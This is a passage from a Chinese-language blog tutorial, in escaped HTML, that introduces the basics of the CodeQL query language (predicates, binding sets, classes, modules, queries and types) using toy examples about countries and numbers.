class_\">string</span> &#123;</span><br><span class=\"line\">  Countries() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;India&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> M &#123;</span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">EuropeanCountries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Countries</span> &#123;</span><br><span class=\"line\">    EuropeanCountries() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">      <span class=\"type\">or</span></span><br><span class=\"line\">      <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以用如下方式使用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> CountriesLib</span><br><span class=\"line\"></span><br><span class=\"line\">from M::EuropeanCountries ec</span><br><span class=\"line\">select ec</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> CountriesLib::M</span><br><span class=\"line\"></span><br><span class=\"line\">from EuropeanCountries ec</span><br><span class=\"line\">select ec</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Namespaces\"><a href=\"#Namespaces\" class=\"headerlink\" title=\"Namespaces\"></a>Namespaces</h2><p>命名空间。和其它语言比较像，不过多解释。</p>\n<h3 id=\"Global-namespaces\"><a href=\"#Global-namespaces\" class=\"headerlink\" title=\"Global namespaces\"></a>Global namespaces</h3><h3 id=\"Local-namespaces\"><a href=\"#Local-namespaces\" class=\"headerlink\" title=\"Local namespaces\"></a>Local namespaces</h3><h1 id=\"QL-language-specification\"><a href=\"#QL-language-specification\" class=\"headerlink\" title=\"QL language specification\"></a>QL language specification</h1><p>语言规范太多了，这里就不细讲了。</p>\n<p><a href=\"https://codeql.github.com/docs/ql-language-reference/ql-language-specification/\">https://codeql.github.com/docs/ql-language-reference/ql-language-specification/</a></p>\n","excerpt":"","more":"<p>csdn上阅读体验更加，这个目录太长这里用着不太舒服<br><a href=\"https://blog.csdn.net/qq_72685284/article/details/144118176\">https://blog.csdn.net/qq_72685284/article/details/144118176</a></p>\n<p>网上对于codeql的基础讲解的比较少，很多都是直接从codeql for java 或者直接拿一个靶场开始练习的。我通过对官方文档的一些翻译和加上自己的一些个人的理解和丰富合适的例子。帮助新人对codeql有一个基础的认识。因为好多英文名词并没有比较统一的翻译，所以我这里会标注一些关键的英文词的中文含义，很多意思还需要大家从英文的原文中体会其中的含义，同时方便大家结合文档进行查看。</p>\n<p>参考文档。</p>\n<p><a href=\"https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/\">https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/</a></p>\n<h1 id=\"declarative-languages\"><a href=\"#declarative-languages\" class=\"headerlink\" title=\"declarative languages\"></a>declarative languages</h1><p>声明式(declarative)是结果导向的，命令式(imperative)是过程导向的。它们都有自己适用的场景和局限，于是现实中的编程语言常常都有两者的身影。</p>\n<p>declarative 案例 ： SQL, HTML ,codeql</p>\n<p>imperative 案例 ： C, C++, Java</p>\n<blockquote>\n<p>QL is a declarative, object-oriented(面向对象的) query language that is optimized(优化) to enable efficient analysis of hierarchical data structures, in particular, databases representing software artifacts.</p>\n<p>The syntax(语法) of QL is similar to SQL, but the semantics(语意) of QL are based on Datalog, a declarative logic programming language often used as a query language. This makes QL primarily a logic language, and all operations in QL are logical operations. Furthermore, QL inherits recursive(递归) predicates(谓语) from Datalog, and adds support for aggregates(聚合), making even complex queries concise(简洁) and simple. </p>\n</blockquote>\n<p>总之就是codeql的语法和常规的编程语言不太一样，他是基于datalog的，不能拿C,java 那类语言去类比，有很多的概念和专业用语都是不太一样的。</p>\n<blockquote>\n<p>Object orientation(面向对象) is an important feature of QL. The benefits of object orientation are well known – it increases modularity(模块化), enables information hiding, and allows code reuse(复用). QL offers all these benefits without compromising(妥协) on its logical foundation. This is achieved by defining a simple object model where classes are modeled as predicates and inheritance as implication. The libraries made available for all supported languages make extensive use of classes and inheritance.</p>\n</blockquote>\n<p>与sql相比，codeql的语言功能更加丰富，增加了面相对象的特性。可以自定义谓词。</p>\n<h1 id=\"谓词Properties\"><a href=\"#谓词Properties\" class=\"headerlink\" title=\"谓词Properties\"></a>谓词Properties</h1><p>谓词用于描述构成 QL 程序的逻辑关系。</p>\n<p>严格来说，谓词求值为一组元组。例如，考虑以下两个谓词定义：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate <span class=\"title function_\">isCountry</span><span class=\"params\">(string country)</span> &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">predicate <span class=\"title function_\">hasCapital</span><span class=\"params\">(string country, string capital)</span> &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;Belgium&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">capital</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Brussels&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">capital</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Berlin&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">capital</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Paris&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from string country, string capital</span><br><span class=\"line\">where <span class=\"title function_\">hasCapital</span><span class=\"params\">(country, capital)</span> <span class=\"type\">and</span> <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">select country, capital</span><br></pre></td></tr></table></figure>\n\n<p>谓词 isCountry 返回的是一组一元组 {(“Belgium”),(“Germany”),(“France”)}，而 hasCapital 是一组二元组 {(“Belgium”,”Brussels”),(“Germany”,”Berlin”),(“France”,”Paris”)}。这些谓词的元数分别为 1 和 2。</p>\n<p>通常，谓词中的所有元组都具有相同数量的元素。谓词的 arity 就是元素的数量，不包括可能的结果变量。</p>\n<p>QL 中有许多内置谓词。您可以在任何查询中使用这些谓词，而无需导入任何其他模块。除了这些内置谓词之外，您还可以定义自己的谓词：</p>\n<h2 id=\"谓词组成\"><a href=\"#谓词组成\" class=\"headerlink\" title=\"谓词组成\"></a>谓词组成</h2><ul>\n<li>谓词的关键字predicate，或者谓词的返回值。（谓词可以分为without result 和 with result）</li>\n<li>谓词名词</li>\n<li>谓词参数</li>\n<li>谓词主体</li>\n</ul>\n<h2 id=\"without-result\"><a href=\"#without-result\" class=\"headerlink\" title=\"without result\"></a>without result</h2><p>开头那两个谓词也是 without result 的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate <span class=\"title function_\">isSmall</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">    i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\">where <span class=\"title function_\">isSmall</span><span class=\"params\">(i)</span></span><br><span class=\"line\">select i</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"with-result\"><a href=\"#with-result\" class=\"headerlink\" title=\"with result\"></a>with result</h2><p>您可以通过将关键字 predicate 替换为结果类型来定义带有结果的谓词。这引入了特殊变量 result。result的值就是我们的返回值。</p>\n<p>这个from就是定义一个变量。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">\tresult = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">\ti in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> x</span><br><span class=\"line\">select x,getSuccessor(x)</span><br></pre></td></tr></table></figure>\n\n<p>可以在谓词主体中调用其他的谓词</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person <span class=\"title function_\">getAChildOf</span><span class=\"params\">(Person p)</span> &#123;</span><br><span class=\"line\">  p = getAParentOf(result)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>谓词还可能对其参数的每个值产生多个结果（或根本没有结果）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string <span class=\"title function_\">getANeighbor</span><span class=\"params\">(string country)</span> &#123;</span><br><span class=\"line\">\tcountry = <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">\t<span class=\"type\">or</span></span><br><span class=\"line\">\t<span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">\t<span class=\"type\">or</span></span><br><span class=\"line\">\t<span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Austria&quot;</span></span><br><span class=\"line\">\t<span class=\"type\">or</span></span><br><span class=\"line\">\t<span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">getANeighbor</span><span class=\"params\">(<span class=\"string\">&quot;France&quot;</span>)</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Recursive-递归-predicates\"><a href=\"#Recursive-递归-predicates\" class=\"headerlink\" title=\"Recursive(递归) predicates\"></a>Recursive(递归) predicates</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string <span class=\"title function_\">getANeighbor</span><span class=\"params\">(string country)</span> &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Austria&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> getANeighbor(result)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Kinds-种类-of-predicates\"><a href=\"#Kinds-种类-of-predicates\" class=\"headerlink\" title=\"Kinds(种类) of predicates\"></a>Kinds(种类) of predicates</h2><p>谓词有三种类型，即Non-member谓词、member谓词和Characteristic谓词。</p>\n<p>非成员谓词是在类之外定义的，也就是说，它们不是任何类的成员。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;  <span class=\"comment\">// 1. Non-member predicate</span></span><br><span class=\"line\">  result = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">  i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FavoriteNumbers</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  FavoriteNumbers() &#123;  <span class=\"comment\">// 2. Characteristic predicate</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> or  <span class=\"comment\">//特征谓词是类的构造函数中定义的谓词，用来描述类的成员资格（membership criteria）。它决定了一个值是否属于某个类。</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">4</span> <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">9</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  string <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;   <span class=\"comment\">// 3. Member predicate for the class `FavoriteNumbers`</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;one&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">4</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;four&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">9</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;nine&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from FavoriteNumbers fn, string name</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">fn</span> <span class=\"operator\">=</span> <span class=\"number\">4</span> and fn.getName() = name  <span class=\"comment\">// 成员谓词只能在类的实例上应用</span></span><br><span class=\"line\">select name</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Binding-behavior\"><a href=\"#Binding-behavior\" class=\"headerlink\" title=\"Binding behavior\"></a>Binding behavior</h2><p>It must be possible to evaluate a predicate in a finite(有限的) amount of time, so the set it describes is not usually allowed to be infinite(无限的). In other words, a predicate can only contain a finite number of tuples.</p>\n<p>这里的无限其实也不是无穷大或者无穷多。上面和下面的那些反例其实也就是多了一点判断条件。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">\tresult = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">\ti in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  Compilation errors:</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: &quot;i&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: &quot;result&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: expression &quot;i * 4&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">multiplyBy4</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">  result = i * <span class=\"number\">4</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  Compilation errors:</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: &quot;str&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: expression &quot;str.length()&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">predicate <span class=\"title function_\">shortString</span><span class=\"params\">(string str)</span> &#123;</span><br><span class=\"line\">  str.length() &lt; <span class=\"number\">10</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Binding-sets\"><a href=\"#Binding-sets\" class=\"headerlink\" title=\"Binding sets\"></a>Binding sets</h3><p>如果一定要用infinite的谓词。</p>\n<p>在这种情况下，您可以使用 bindingset 注释指定显式绑定集。此注释适用于任何类型的谓词。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[i]</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">multiplyBy4</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">  result = i * <span class=\"number\">4</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\">where i in [<span class=\"number\">1</span> .. <span class=\"number\">10</span>]</span><br><span class=\"line\">select <span class=\"title function_\">multiplyBy4</span><span class=\"params\">(i)</span></span><br></pre></td></tr></table></figure>\n\n<p>也可以多个，这种形式的意思是。x,y至少有一个是bound的。和bindingset[x, y]不同，意味着两个都是bound的</p>\n<ul>\n<li>If <code>x</code> is bound, then <code>x</code> and <code>y</code> are bound.</li>\n<li>If <code>y</code> is bound, then <code>x</code> and <code>y</code> are bound.</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[x] bindingset[y]</span><br><span class=\"line\">predicate <span class=\"title function_\">plusOne</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> &#123;</span><br><span class=\"line\">  x + <span class=\"number\">1</span> = y</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> x, <span class=\"type\">int</span> y</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> <span class=\"number\">42</span> and <span class=\"title function_\">plusOne</span><span class=\"params\">(x, y)</span></span><br><span class=\"line\">select x, y</span><br></pre></td></tr></table></figure>\n\n<p>后者可以用于两种不同类型的情况</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[str, len]</span><br><span class=\"line\">string <span class=\"title function_\">truncate</span><span class=\"params\">(string str, <span class=\"type\">int</span> len)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> str.length() &gt; len</span><br><span class=\"line\">  <span class=\"type\">then</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> str.prefix(len)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> result = str</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"查询Queries\"><a href=\"#查询Queries\" class=\"headerlink\" title=\"查询Queries\"></a>查询Queries</h1><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> <span class=\"comment\">/* ... 声明变量 ... */</span></span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"comment\">/* ... logical formula ... */</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"comment\">/* ... expressions ... */</span></span><br></pre></td></tr></table></figure>\n\n<p>除了“表达式”中描述的表达式之外，您还可以包括：<br>as 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。<br>order by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。</p>\n<p>from 和 where 部分是可选的。</p>\n<p>除了“表达式”中描述的表达式之外，您还可以包括：</p>\n<ul>\n<li>as 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。</li>\n<li>order by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。</li>\n</ul>\n<p>这些和sql都差不多，不同地方在于是，这里的from可以声明变量。</p>\n<p>例子</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> <span class=\"type\">int</span> x, <span class=\"type\">int</span> y</span><br><span class=\"line\"><span class=\"keyword\">where</span> x <span class=\"operator\">=</span> <span class=\"number\">3</span> <span class=\"keyword\">and</span> y <span class=\"keyword\">in</span> [<span class=\"number\">0</span> .. <span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">select</span> x, y, x <span class=\"operator\">*</span> y <span class=\"keyword\">as</span> product, &quot;product: &quot; <span class=\"operator\">+</span> product</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Query-predicates\"><a href=\"#Query-predicates\" class=\"headerlink\" title=\"Query predicates\"></a>Query predicates</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getProduct</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> &#123;</span><br><span class=\"line\">    x = <span class=\"number\">3</span> and</span><br><span class=\"line\">    y in [<span class=\"number\">0</span> .. <span class=\"number\">2</span>] <span class=\"type\">and</span></span><br><span class=\"line\">    <span class=\"variable\">result</span> <span class=\"operator\">=</span> x * y</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> x, <span class=\"type\">int</span> y</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">x</span> <span class=\"operator\">=</span> <span class=\"number\">3</span> <span class=\"type\">and</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> <span class=\"number\">1</span> </span><br><span class=\"line\">select x, y,getProduct(x, y)</span><br></pre></td></tr></table></figure>\n\n<p>这个查询谓语返回以下结果</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">x</th>\n<th align=\"left\">y</th>\n<th align=\"left\">result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">3</td>\n<td align=\"left\">0</td>\n<td align=\"left\">0</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">1</td>\n<td align=\"left\">3</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">2</td>\n<td align=\"left\">6</td>\n</tr>\n</tbody></table>\n<p>编写查询谓词而不是 select 子句的一个好处是，您也可以在代码的其他部分调用该谓词。相比之下，select 子句就像一个匿名谓词，因此您无法稍后调用它。</p>\n<h1 id=\"Types\"><a href=\"#Types\" class=\"headerlink\" title=\"Types\"></a>Types</h1><h2 id=\"Primitive-types\"><a href=\"#Primitive-types\" class=\"headerlink\" title=\"Primitive types\"></a>Primitive types</h2><p>有以下这些类型。</p>\n<p>boolean，float，int，string，date。</p>\n<p>QL 在原始类型上定义了一系列内置操作，例如，1.toString() 是整数常量 1 的字符串表示形式。有关 QL 